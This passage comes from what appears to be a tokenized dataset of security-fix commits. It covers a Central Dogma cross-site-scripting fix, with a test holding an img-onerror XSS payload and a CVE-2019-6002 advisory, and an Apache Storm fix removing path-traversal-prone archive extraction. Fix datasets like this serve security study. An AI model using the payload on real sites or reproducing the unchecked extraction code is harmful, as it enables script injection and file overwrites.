"\"", "failed", "to", "get", "data", "from", "'", "\"", "+", "parent", ".", "name", "(", ")", "+", "'", "/'", "+", "name", "+", "\"", "'", "at", "\"", "+", "pathPattern", "\"", "for", "\"", "+", "revision", ",", "e", ")", ";", "}", "finally", "{", "readUnlock", "(", ");", "}", "@", "@", "-", "617", ",", "7", "+", "618", ",", "7", "@", "@", "public", "RevisionRange", "normalizeNow", "(", "Revision", "from", ",", "Revision", "to", ")", "{", "throw", "e", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "StorageException", "(", "\"", "failed", "to", "retrieve", "the", "history", ":", "\"", "+", "jGitRepository", "+", "\"", "failed", "to", "retrieve", "the", "history", ":", "\"", "+", "parent", ".", "name", "(", ")", "+", "'", "/'", "+", "name", "\"", "(", "\"", "+", "pathPattern", "+", "\"", ",", "\"", "+", "from", "+", "\"", "..", "\"", "+", "to", "+", "'", ")'", ",", "e", ")", ";", "}", "finally", "{", "readUnlock", "(", ");", "@", "@", "-", "949", ",", "7", "+", "950", ",", "7", "@", "@", "private", "CommitResult", "commit0", "(", "@", "Nullable", "Revision", "prevRevision", ",", "Revision", "nextRevis", "}", "catch", "(", "CentralDogmaException", "|", "IllegalArgumentException", "e", ")", "{", "throw", "e", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "StorageException", "(", "\"", "failed", "to", "push", "at", "\"", "+", "jGitRepository", ",", "e", ")", ";", "throw", "new", "StorageException", "(", "\"", "failed", "to", "push", "at", "'", "\"", "+", "parent", ".", "name", "(", ")", "+", "'", "/'", "+", "name", "+", "'", "\\'", "',", "e", ")", ";", "}", "}", "@", "@", "-", "1453", ",", "7", "+", "1454", ",", "7", "@", "@", "private", "Revision", "uncachedHeadRevision", "(", ")", "{", "throw", "new", "StorageException", "(", "\"", "failed", "to", "get", "the", "current", "revision", "\"", ",", "e", ")", ";", "}", "throw", "new", "StorageException", "(", "\"", "failed", "to", "determine", "the", "HEAD", ":", "\"", "+", "jGitRepository", ".", "getDirectory", "(", "))", ";", "throw", "new", "StorageException", "(", "\"", "failed", "to", "determine", "the", "HEAD", ":", "\"", "+", "parent", ".", "name", "(", ")", "+", "'", "/'", "+", "name", ")", ";", "}", "private", "RevTree", "toTree", "(", "RevWalk", "revWalk", ",", "Revision", "revision", ")", "{", "@", "@", "-", "28", ",", "7", "+", "28", ",", "7", "@", "@", "angular", ".", "module", "(", "'", "CentralDogmaAdmin", "'", ")", "if", "(", "typeof", "arg", "=", "==", "'", "object", "'", "&", "&", "typeof", "arg", ".", "status", "=", "==", "'", "number", "'", "&", "&", "typeof", "arg", ".", "statusText", "=", "==", "'", "string", "'", ")", "{", "if", "(", "StringUtil", ".", "isNotEmpty", "(", "arg", ".", "message", ")", ")", "{", "Notification", ".", "error", "(", "arg", ".", "message", ")", ";", "Notification", ".", "error", "(", "StringUtil", ".", "escapeHtml", "(", "arg", ".", "message", ")", ");", "}", "else", "{", "var", "message", "=", "arg", ".", "status", "+", "'", "'", "+", "arg", ".", "statusText", ";", "if", "(", "arg", ".", "status", "=", "==", "401", ")", "{", "@", "@", "-", "91", ",", "6", "+", "91", ",", "14", "@", "@", "angular", ".", "module", "(", "'", "CentralDogmaAdmin", "'", ")", "result", "+", "=", "'", "/'", ";", "}", "return", "result", ";", "}", ",", "escapeHtml", ":", "function", "(", "unsafe", ")", "{", "return", "unsafe", ".", "replace", "(", "/&", "/", "g", ",", "\"", "&", "amp", ";", "\")", ".", "replace", "(", "/<", "/", "g", ",", "\"", "&", "lt", ";", "\")", ".", "replace", "(", "/>", "/", "g", ",", "\"", "&", "gt", ";", "\")", ".", "replace", "(", "/\"", "/", "g", ",", "\"", "&", "quot", ";", "\")", ".", "replace", "(", "/'", "/", "g", ",", "\"", "&#", "039", ";", "\")", ";", "}", "}", ";", "}", ");", "@", "@", "-", "938", ",", "6", "+", "938", ",", "14", "@", "@", "public", "void", "testFindNone", "(", ")", "{", "assertThat", "(", "repo", ".", "find", "(", "HEAD", ",", "\"", "non", "-", "existent", "\"", ").", "join", "(", "))", ".", "isEmpty", "(", ");", "}", "@", "Test", "public", "void", "testFind_invalidPathPattern", "(", ")", "{", "final", "String", "pattern", "=", "\"", "a", "'", "\\\"", "><", "img", "src", "=", "1", "onerror", "=", "alert", "(", "document", ".", "domain", ")", ">\"", ";", "assertThatThrownBy", "(", "()", "-", ">", "repo", ".", "find", "(", "HEAD", ",", "pattern", ")", ".", "join", "(", "))", ".", "isInstanceOf", "(", "CompletionException", ".", "class", ")", ".", "hasCauseInstanceOf", "(", "IllegalArgumentException", ".", "class", ")", ";", "}", "/", "**", "*", "when", "the", "target", "path", "or", "revision", "is", "not", "valid", ",", "return", "an", "empty", "map", ".", "*", "/", "@", "@", "-", "17", ",", "3", "+", "17", ",", "18", "@", "@", "Known", "issues", "-", "Consider", "enforcing", "network", "-", "level", "access", "control", "over", "Thrift", "calls", ".", "-", "Note", "that", "the", "Thrift", "RPC", "layer", "is", "left", "only", "for", "backward", "compatibility", ",", "and", "will", "be", "removed", "in", "the", "future", ",", "in", "favor", "of", "the", "REST", "API", ".", "Previously", "known", "issues", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "DOM", "based", ",", "Cross", "-", "site", "Scripting", "(", "XSS", ")", "was", "found", "in", "Central", "Dogma", ".", "An", "attacker", "could", "exploit", "this", "by", "convincing", "an", "authenticated", "user", "to", "visit", "a", "specifically", "crafted", "URL", "on", "a", "CentralDogma", "server", ",", "allowing", "for", "the", "execution", "of", "arbitrary", "scripts", "on", "the", "client", "-", "side", "browser", ",", "resulting", "to", "perform", "unauthorized", "actions", ".", "-", "This", "issue", "affects", ":", "Central", "Dogma", "artifacts", "from", "0", ".", "17", ".", "0", "to", "0", ".", "40", ".", "1", ".", "-", "The", "impact", ":", "Attacker", "is", "able", "to", "have", "victim", "execute", "arbitrary", "JavaScript", "code", "in", "the", "browser", ".", "-", "The", "component", ":", "Notification", "feature", "-", "The", "attack", "vector", ":", "Victim", "must", "open", "a", "specifically", "crafted", "URL", ".", "-", "The", "fixed", "version", ":", "0", ".", "41", ".", "0", "and", "later", ".", "-", "Please", "check", "`", "CVE", "-", "2019", "-", "6002", "<", "https", ":", "//", "cve", ".", "mitre", ".", "org", "/", "cgi", "-", "bin", "/", "cvename", ".", "cgi", "?", "name", "=", "CVE", "-", "2019", "-", "6002", ">", "`", "_", "to", "get", "more", "information", ".", "-", "If", "you", "found", "security", "bugs", ",", "please", "let", "us", "know", "`", "dl_oss_dev", "@", "linecorp", ".", "com", "<", "mailto", ":", "dl_oss_dev", "@", "linecorp", ".", "com", ">", "`", "_", "or", "send", "`", "Slack", "DM", "<", "https", ":", "//", "join", ".", "slack", ".", "com", "/", "t", "/", "central", "-", "dogma", "/", "shared_invite", "/", "enQtNjA5NDk5MTExODQzLWRlZTZmZDljNDY3OTBmN2Y1NDAwMGUzMTMzNmFlOTYzNzYyNDNmNmM5YTk3YmExM2M4NGRkOTY2NTE1MDJhODY", ">", "`", "_", "to", "maintainer", "."], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["STORM-3052:", "Allow", "for", "untar/unzip", "to", "work", "on", "older", "versions"], "code_tokens": ["@", "@", "-", "86", ",", "6", "+", "86", ",", "7", "@", "@", "private", "final", "IAdvancedFSOps", "fsOps", ";", "private", "final", "String", "user", ";", "private", "final", "Map", "<", "String", ",", "Object", ">", "conf", ";", "private", "final", "boolean", "symLinksDisabled", ";", "/", "/", "size", "of", "the", "resource", "private", "long", "size", "=", "-", "1", ";", "@", "@", "-", "95", ",", "6", "+", "96", ",", "7", "@", "@", "Path", "base", "=", "getLocalUserFileCacheDir", "(", "localBaseDir", ",", "user", ")", ";", "this", ".", "baseDir", "=", "uncompressed", "?", "getCacheDirForArchives", "(", "base", ")", ":", "getCacheDirForFiles", "(", "base", ")", ";", "this", ".", "conf", "=", "conf", ";", "this", ".", "symLinksDisabled", "=", "(", "boolean", ")", "conf", ".", "getOrDefault", "(", "Config", ".", "DISABLE_SYMLINKS", ",", "false", ")", ";", "this", ".", "user", "=", "user", ";", "this", ".", "fsOps", "=", "fsOps", ";", "versionFilePath", "=", "constructVersionFileName", "(", "baseDir", ",", "key", ")", ";", "@", "@", "-", "273", ",", "7", "+", "275", ",", "7", "@", "@", "public", "long", "downloadToTempLocation", "(", "ClientBlobStore", "store", ")", "throws", "IOException", ",", "Ke", "}", "}", "if", "(", "uncompressed", ")", "{", "ServerUtils", ".", "unpack", "(", "downloadFile", ".", "toFile", "(", "),", "finalLocation", ".", "toFile", "(", "))", ";", "ServerUtils", ".", "unpack", "(", "downloadFile", ".", "toFile", "(", "),", "finalLocation", ".", "toFile", "(", "),", "symLinksDisabled", ")", ";", "LOG", ".", "debug", "(", "\"", "Uncompressed", "{", "}", "to", ":", "{", "}\"", ",", "downloadFile", ",", "finalLocation", ")", ";", "}", "setBlobPermissions", "(", "conf", ",", "user", ",", "finalLocation", ")", ";", "@", "@", "-", "32", ",", "14", "+", "32", ",", "19", "@", "@", "import", "java", ".", "io", ".", "RandomAccessFile", ";", "import", "java", ".", "nio", ".", "file", ".", "FileSystems", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "LinkOption", ";", "import", "java", ".", "nio", ".", "file", ".", "Path", ";", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";", "import", "java", ".", "nio", ".", "file", ".", "attribute", ".", "PosixFilePermission", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Enumeration", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "util", ".", "jar", ".", "JarEntry", ";", "import", "java", ".", "util", ".", "jar", ".", "JarFile", ";", "import", "java", ".", "util", ".", "zip", ".", "GZIPInputStream", ";", "@", "@", "-", "378", ",", "52", "+", "383", ",", "9", "@", "@", "public", "static", "boolean", "canUserReadBlob", "(", "ReadableBlobMeta", "meta", ",", "String", "user", ",", "Map", "<", "St", "*", "@", "param", "jarFile", "the", ".", "jar", "file", "to", "unpack", "*", "@", "param", "toDir", "the", "destination", "directory", "into", "which", "to", "unpack", "the", "jar", "*", "/", "public", "static", "void", "unJar", "(", "File", "jarFile", ",", "File", "toDir", ")", "throws", "IOException", "{", "JarFile", "jar", "=", "new", "JarFile", "(", "jarFile", ")", ";", "try", "{", "Enumeration", "<", "JarEntry", ">", "entries", "=", "jar", ".", "entries", "(", ");", "while", "(", "entries", ".", "hasMoreElements", "(", "))", "{", "final", "JarEntry", "entry", "=", "entries", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", "))", "{", "InputStream", "in", "=", "jar", ".", "getInputStream", "(", "entry", ")", ";", "try", "{", "File", "file", "=", "new", "File", "(", "toDir", ",", "entry", ".", "getName", "(", "))", ";", "ensureDirectory", "(", "file", ".", "getParentFile", "(", "))", ";", "OutputStream", "out", "=", "new", "FileOutputStream", "(", "file", ")", ";", "try", "{", "copyBytes", "(", "in", ",", "out", ",", "8192", ")", ";", "}", "finally", "{", "out", ".", "close", "(", ");", "}", "}", "finally", "{", "in", ".", "close", "(", ");", "}", "}", "}", "}", "finally", "{", "jar", ".", "close", "(", ");", "}", "}", "/", "**", "*", "Copies", "from", "one", "stream", "to", "another", ".", "*", "*", "@", "param", "in", "InputStream", "to", "read", "from", "*", "@", "param", "out", "OutputStream", "to", "write", "to", "*", "@", "param", "buffSize", "the", "size", "of", "the", "buffer", "*", "/", "public", "static", "void", "copyBytes", "(", "InputStream", "in", ",", "OutputStream", "out", ",", "int", "buffSize", ")", "throws", "IOException", "{", "PrintStream", "ps", "=", "out", "instanceof", "PrintStream", "?", "(", "PrintStream", ")", "out", ":", "null", ";", "byte", "buf", "[", "]", "=", "new", "byte", "[", "buffSize", "]", ";", "int", "bytesRead", "=", "in", ".", "read", "(", "buf", ")", ";", "while", "(", "bytesRead", ">", "=", "0", ")", "{", "out", ".", "write", "(", "buf", ",", "0", ",", "bytesRead", ")", ";", "if", "(", "(", "ps", "!", "=", "null", ")", "&", "&", "ps", ".", "checkError", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Unable", "to", "write", "to", "output", "stream", ".", "\")", ";", "}", "bytesRead", "=", "in", ".", "read", "(", "buf", ")", ";", "public", "static", "void", "unJar", "(", "File", "jarFile", ",", "File", "toDir", ")", "throws", "IOException", "{", "try", "(", "JarFile", "jar", "=", "new", "JarFile", "(", "jarFile", ")", ")", "{", "extractZipFile", "(", "jar", ",", "toDir", ",", "null", ")", ";", "}", "}", "@", "@", "-", "446", ",", "20", "+", "408", ",", "17", "@", "@", "private", "static", "void", "ensureDirectory", "(", "File", "dir", ")", "throws", "IOException", "{", "*", "*", "@", "param", "inFile", "The", "tar", "file", "as", "input", ".", "*", "@", "param", "untarDir", "The", "untar", "directory", "where", "to", "untar", "the", "tar", "file", ".", "*", "@", "param", "symlinksDisabled", "true", "if", "symlinks", "should", "be", "disabled", ",", "else", "false", ".", "*", "@", "throws", "IOException", "*", "/", "public", "static", "void", "unTar", "(", "File", "inFile", ",", "File", "untarDir", ")", "throws", "IOException", "{", "if", "(", "!", "untarDir", ".", "mkdirs", "(", "))", "{", "if", "(", "!", "untarDir", ".", "isDirectory", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "\"", "+", "untarDir", ")", ";", "}", "}", "public", "static", "void", "unTar", "(", "File", "inFile", ",", "File", "untarDir", ",", "boolean", "symlinksDisabled", ")", "throws", "IOException", "{", "ensureDirectory", "(", "untarDir", ")", ";", "boolean", "gzipped", "=", "inFile", ".", "toString", "(", ").", "endsWith", "(", "\"", "gz", "\"", ");", "if", "(", "Utils", ".", "isOnWindows", "(", "))", "{", "if", "(", "Utils", ".", "isOnWindows", "(", ")", "|", "|", "symlinksDisabled", ")", "{", "/", "/", "Tar", "is", "not", "native", "to", "Windows", ".", "Use", "simple", "Java", "based", "implementation", "for", "/", "/", "tests", "and", "simple", "tar", "archives", "unTarUsingJava", "(", "inFile", ",", "untarDir", ",", "gzipped", ")", ";", "unTarUsingJava", "(", "inFile", ",", "untarDir", ",", "gzipped", ",", "symlinksDisabled", ")", ";", "}", "else", "{", "/", "/", "spawn", "tar", "utility", "to", "untar", "archive", "for", "full", "fledged", "unix", "behavior", "such", "/", "/", "as", "resolving", "symlinks", "in", "tar", "archives", "@", "@", "-", "496", ",", "7", "+", "455", ",", "9", "@", "@", "private", "static", "void", "unTarUsingTar", "(", "File", "inFile", ",", "File", "untarDir", ",", "}", "private", "static", "void", "unTarUsingJava", "(", "File", "inFile", ",", "File", "untarDir", ",", "boolean", "gzipped", ")", "throws", "IOException", "{", "boolean", "gzipped", ",", "boolean", "symlinksDisabled", ")", "throws", "IOException", "{", "final", "String", "base", "=", "untarDir", ".", "getCanonicalPath", "(", ");", "LOG", ".", "trace", "(", "\"", "java", "untar", "{", "}", "to", "{", "}\"", ",", "inFile", ",", "base", ")", ";", "InputStream", "inputStream", "=", "null", ";", "try", "{", "if", "(", "gzipped", ")", "{", "@", "@", "-", "507", ",", "7", "+", "468", ",", "7", "@", "@", "private", "static", "void", "unTarUsingJava", "(", "File", "inFile", ",", "File", "untarDir", ",", "}", "try", "(", "TarArchiveInputStream", "tis", "=", "new", "TarArchiveInputStream", "(", "inputStream", ")", ")", "{", "for", "(", "TarArchiveEntry", "entry", "=", "tis", ".", "getNextTarEntry", "(", ");", "entry", "!", "=", "null", ";", ")", "{", "unpackEntries", "(", "tis", ",", "entry", ",", "untarDir", ")", ";", "unpackEntries", "(", "tis", ",", "entry", ",", "untarDir", ",", "base", ",", "symlinksDisabled", ")", ";", "entry", "=", "tis", ".", "getNextTarEntry", "(", ");", "}", "}", "@", "@", "-", "519", ",", "47", "+", "480", ",", "99", "@", "@", "private", "static", "void", "unTarUsingJava", "(", "File", "inFile", ",", "File", "untarDir", ",", "}", "private", "static", "void", "unpackEntries", "(", "TarArchiveInputStream", "tis", ",", "TarArchiveEntry", "entry", ",", "File", "outputDir", ")", "throws", "IOException", "{", "TarArchiveEntry", "entry", ",", "File", "outputDir", ",", "final", "String", "base", ",", "boolean", "symlinksDisabled", ")", "throws", "IOException", "{", "File", "target", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "String", "found", "=", "target", ".", "getCanonicalPath", "(", ");", "if", "(", "!", "found", ".", "startsWith", "(", "base", ")", ")", "{", "LOG", ".", "error", "(", "\"", "Invalid", "location", "{", "}", "is", "outside", "of", "{", "}\"", ",", "found", ",", "base", ")", ";", "return", ";", "}", "if", "(", "entry", ".", "isDirectory", "(", "))", "{", "File", "subDir", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "subDir", ".", "mkdirs", "(", ")", "&", "&", "!", "subDir", ".", "isDirectory", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "tar", "internal", "dir", "\"", "+", "outputDir", ")", ";", "}", "LOG", ".", "trace", "(", "\"", "Extracting", "dir", "{", "}\"", ",", "target", ")", ";", "ensureDirectory", "(", "target", ")", ";", "for", "(", "TarArchiveEntry", "e", ":", "entry", ".", "getDirectoryEntries", "(", "))", "{", "unpackEntries", "(", "tis", ",", "e", ",", "subDir", ")", ";", "unpackEntries", "(", "tis", ",", "e", ",", "target", ",", "base", ",", "symlinksDisabled", ")", ";", "}", "return", ";", "}", "else", "if", "(", "entry", ".", "isSymbolicLink", "(", "))", "{", "if", "(", "symlinksDisabled", ")", "{", "LOG", ".", "info", "(", "\"", "Symlinks", "disabled", "skipping", "{", "}\"", ",", "target", ")", ";", "}", "else", "{", "Path", "src", "=", "target", ".", "toPath", "(", ");", "Path", "dest", "=", "Paths", ".", "get", "(", "entry", ".", "getLinkName", "(", "))", ";", "LOG", ".", "trace", "(", "\"", "Extracting", "sym", "link", "{", "}", "to", "{", "}\"", ",", "target", ",", "dest", ")", ";", "/", "/", "Create", "symbolic", "link", "relative", "to", "tar", "parent", "dir", "Files", ".", "createSymbolicLink", "(", "src", ",", "dest", ")", ";", "}", "}", "else", "if", "(", "entry", ".", "isFile", "(", "))", "{", "LOG", ".", "trace", "(", "\"", "Extracting", "file", "{", "}\"", ",", "target", ")", ";", "ensureDirectory", "(", "target", ".", "getParentFile", "(", "))", ";", "try", "(", "BufferedOutputStream", "outputStream", "=", "new", "BufferedOutputStream", "(", "new", "FileOutputStream", "(", "target", ")", "))", "{", "IOUtils", ".", "copy", "(", "tis", ",", "outputStream", ")", ";", "}", "}", "else", "{", "LOG", ".", "error", "(", "\"{", "}", "is", "not", "a", "currently", "supported", "tar", "entry", "type", ".", "\",", "entry", ")", ";", "}", "File", "outputFile", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "outputFile", ".", "getParentFile", "(", ").", "exists", "(", "))", "{", "if", "(", "!", "outputFile", ".", "getParentFile", "(", ").", "mkdirs", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "tar", "internal", "dir", "\"", "+", "outputDir", ")", ";", "Path", "p", "=", "target", ".", "toPath", "(", ");", "if", "(", "Files", ".", "exists", "(", "p", ")", ")", "{", "try", "{", "/", "/", "We", "created", "it", "so", "lets", "chmod", "it", "properly", "int", "mode", "=", "entry", ".", "getMode", "(", ");", "Files", ".", "setPosixFilePermissions", "(", "p", ",", "parsePerms", "(", "mode", ")", ");", "}", "catch", "(", "UnsupportedOperationException", "e", ")", "{", "/", "/", "Ignored", "the", "file", "system", "we", "are", "on", "does", "not", "support", "this", ",", "so", "don", "'", "t", "do", "it", ".", "}", "}", "int", "count", ";", "byte", "data", "[", "]", "=", "new", "byte", "[", "2048", "]", ";", "BufferedOutputStream", "outputStream", "=", "new", "BufferedOutputStream", "(", "new", "FileOutputStream", "(", "outputFile", ")", ");", "}", "while", "(", "(", "count", "=", "tis", ".", "read", "(", "data", ")", ")", "!", "=", "-", "1", ")", "{", "outputStream", ".", "write", "(", "data", ",", "0", ",", "count", ")", ";", "private", "static", "Set", "<", "PosixFilePermission", ">", "parsePerms", "(", "int", "mode", ")", "{", "Set", "<", "PosixFilePermission", ">", "ret", "=", "new", "HashSet", "<", ">(", ");", "if", "(", "(", "mode", "&", "0001", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OTHERS_EXECUTE", ")", ";", "}", "if", "(", "(", "mode", "&", "0002", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OTHERS_WRITE", ")", ";", "}", "if", "(", "(", "mode", "&", "0004", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OTHERS_READ", ")", ";", "}", "if", "(", "(", "mode", "&", "0010", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "GROUP_EXECUTE", ")", ";", "}", "outputStream", ".", "flush", "(", ");", "outputStream", ".", "close", "(", ");", "if", "(", "(", "mode", "&", "0020", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "GROUP_WRITE", ")", ";", "}", "if", "(", "(", "mode", "&", "0040", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "GROUP_READ", ")", ";", "}", "if", "(", "(", "mode", "&", "0100", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OWNER_EXECUTE", ")", ";", "}", "if", "(", "(", "mode", "&", "0200", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OWNER_WRITE", ")", ";", "}", "if", "(", "(", "mode", "&", "0400", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OWNER_READ", ")", ";", "}", "return", "ret", ";", "}", "public", "static", "void", "unpack", "(", "File", "localrsrc", ",", "File", "dst", ")", "throws", "IOException", "{", "public", "static", "void", "unpack", "(", "File", "localrsrc", ",", "File", "dst", ",", "boolean", "symLinksDisabled", ")", "throws", "IOException", "{", "String", "lowerDst", "=", "localrsrc", ".", "getName", "(", ").", "toLowerCase", "(", ");", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "jar", "\"", "))", "{", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "jar", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\"", "_jar", "\"", "))", "{", "unJar", "(", "localrsrc", ",", "dst", ")", ";", "}", "else", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "zip", "\"", "))", "{", "}", "else", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "zip", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\"", "_zip", "\"", "))", "{", "unZip", "(", "localrsrc", ",", "dst", ")", ";", "}", "else", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "tar", ".", "gz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\".", "tgz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\".", "tar", "\"", "))", "{", "unTar", "(", "localrsrc", ",", "dst", ")", ";", "lowerDst", ".", "endsWith", "(", "\"", "_tar_gz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\".", "tgz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\"", "_tgz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\".", "tar", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\"", "_tar", "\"", "))", "{", "unTar", "(", "localrsrc", ",", "dst", ",", "symLinksDisabled", ")", ";", "}", "else", "{", "LOG", ".", "warn", "(", "\"", "Cannot", "unpack", "\"", "+", "localrsrc", ")", ";", "if", "(", "!", "localrsrc", ".", "renameTo", "(", "dst", ")", ")", "{", "@", "@", "-", "572", ",", "48", "+", "585", ",", "45", "@", "@", "public", "static", "void", "unpack", "(", "File", "localrsrc", ",", "File", "dst", ")", "throws", "IOException", "{", "}", "}", "private", "static", "void", "extractZipFile", "(", "ZipFile", "zipFile", ",", "File", "toDir", ",", "String", "prefix", ")", "throws", "IOException", "{", "ensureDirectory", "(", "toDir", ")", ";", "final", "String", "base", "=", "toDir", ".", "getCanonicalPath", "(", ");", "Enumeration", "<", "?", "extends", "ZipEntry", ">", "entries", "=", "zipFile", ".", "entries", "(", ");", "while", "(", "entries", ".", "hasMoreElements", "(", "))", "{", "ZipEntry", "entry", "=", "entries", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", "))", "{", "if", "(", "prefix", "!", "=", "null", "&", "&", "!", "entry", ".", "getName", "(", ").", "startsWith", "(", "prefix", ")", ")", "{", "/", "/", "No", "need", "to", "extract", "it", ",", "it", "is", "not", "what", "we", "are", "looking", "for", ".", "continue", ";", "}", "File", "file", "=", "new", "File", "(", "toDir", ",", "entry", ".", "getName", "(", "))", ";", "String", "found", "=", "file", ".", "getCanonicalPath", "(", ");", "if", "(", "!", "found", ".", "startsWith", "(", "base", ")", ")", "{", "LOG", ".", "error", "(", "\"", "Invalid", "location", "{", "}", "is", "outside", "of", "{", "}\"", ",", "found", ",", "base", ")", ";", "continue", ";", "}", "try", "(", "InputStream", "in", "=", "zipFile", ".", "getInputStream", "(", "entry", ")", ")", "{", "ensureDirectory", "(", "file", ".", "getParentFile", "(", "))", ";", "try", "(", "OutputStream", "out", "=", "new", "FileOutputStream", "(", "file", ")", ")", "{", "IOUtils", ".", "copy", "(", "in", ",", "out", ")", ";", "}", "}", "}", "}", "}", "/", "**", "*", "Given", "a", "File", "input", "it", "will", "unzip", "the", "file", "in", "a", "the", "unzip", "directory", "passed", "as", "the", "second", "parameter", "*", "Given", "a", "File", "input", "it", "will", "unzip", "the", "file", "in", "a", "the", "unzip", "directory", "passed", "as", "the", "second", "parameter", ".", "*", "*", "@", "param", "inFile", "The", "zip", "file", "as", "input", "*", "@", "param", "unzipDir", "The", "unzip", "directory", "where", "to", "unzip", "the", "zip", "file", ".", "*", "@", "param", "toDir", "The", "unzip", "directory", "where", "to", "unzip", "the", "zip", "file", ".", "*", "@", "throws", "IOException", "*", "/", "public", "static", "void", "unZip", "(", "File", "inFile", ",", "File", "unzipDir", ")", "throws", "IOException", "{", "Enumeration", "<", "?", "extends", "ZipEntry", ">", "entries", ";", "ZipFile", "zipFile", "=", "new", "ZipFile", "(", "inFile", ")", ";", "try", "{", "entries", "=", "zipFile", ".", "entries", "(", ");", "while", "(", "entries", ".", "hasMoreElements", "(", "))", "{", "ZipEntry", "entry", "=", "entries", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", "))", "{", "InputStream", "in", "=", "zipFile", ".", "getInputStream", "(", "entry", ")", ";", "try", "{", "File", "file", "=", "new", "File", "(", "unzipDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "file", ".", "getParentFile", "(", ").", "mkdirs", "(", "))", "{", "if", "(", "!", "file", ".", "getParentFile", "(", ").", "isDirectory", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "\"", "+", "file", ".", "getParentFile", "(", ").", "toString", "(", "))", ";", "}", "}", "OutputStream", "out", "=", "new", "FileOutputStream", "(", "file", ")", ";", "try", "{", "byte", "[", "]", "buffer", "=", "new", "byte", "[", "8192", "]", ";", "int", "i", ";", "while", "(", "(", "i", "=", "in", ".", "read", "(", "buffer", ")", ")", "!", "=", "-", "1", ")", "{", "out", ".", "write", "(", "buffer", ",", "0", ",", "i", ")", ";", "}", "}", "finally", "{", "out", ".", "close", "(", ");", "}", "}", "finally", "{", "in", ".", "close", "(", ");", "}", "}", "}", "}", "finally", "{", "zipFile", ".", "close", "(", ");", "public", "static", "void", "unZip", "(", "File", "inFile", ",", "File", "toDir", ")", "throws", "IOException", "{", "try", "(", "ZipFile", "zipFile", "=", "new", "ZipFile", "(", "inFile", ")", ")", "{", "extractZipFile", "(", "zipFile", ",", "toDir", ",", "null", ")", ";", "}", "}", "@", "@", "-", "741", ",", "18", "+", "751", ",", "7", "@", "@", "public", "String", "currentClasspathImpl", "(", ")", "{", "public", "void", "extractDirFromJarImpl", "(", "String", "jarpath", ",", "String", "dir", ",", "File", "destdir", ")", "{", "try", "(", "JarFile", "jarFile", "=", "new", "JarFile", "(", "jarpath", ")", ")", "{", "Enumeration", "<", "JarEntry", ">", "jarEnums", "=", "jarFile", ".", "entries", "(", ");", "while", "(", "jarEnums", ".", "hasMoreElements", "(", "))", "{", "JarEntry", "entry", "=", "jarEnums", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", ")", "&", "&", "entry", ".", "getName", "(", ").", "startsWith", "(", "dir", ")", ")", "{", "File", "aFile", "=", "new", "File", "(", "destdir", ",", "entry", ".", "getName", "(", "))", ";", "aFile", ".", "getParentFile", "(", ").", "mkdirs", "(", ");", "try", "(", "FileOutputStream", "out", "=", "new", "FileOutputStream", "(", "aFile", ")", ";", "InputStream", "in", "=", "jarFile", ".", "getInputStream", "(", "entry", ")", ")", "{", "IOUtils", ".", "copy", "(", "in", ",", "out", ")", ";", "}", "}", "}", "extractZipFile", "(", "jarFile", ",", "destdir", ",", "dir", ")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "LOG", ".", "info", "(", "\"", "Could", "not", "extract", "{", "}", "from", "{", "}\"", ",", "dir", ",", "jarpath", ")", ";", "}"], "docstring_tokens": 